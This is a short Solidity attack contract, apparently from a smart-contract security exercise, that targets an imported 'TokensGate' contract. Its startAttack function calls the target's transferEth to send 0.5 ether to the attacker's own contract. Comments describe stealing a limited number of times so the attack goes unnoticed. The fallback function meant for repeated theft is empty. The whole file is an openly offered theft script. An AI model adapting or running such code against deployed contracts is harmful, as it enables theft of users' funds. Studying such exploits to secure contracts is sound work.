pragma solidity ^0.4.0;

import "6.sol";

// I need no ether to attack,

contract GiveMeEverything {
    TokensGate public tg;
    uint64 public theif_counter;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        tg = TokensGate(_addr);
        
        theif_counter = 0;
        theif_counter++;
        
        tg.transferEth(address(this), 500000000000000000 wei);
        
    }
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        
    }
    
}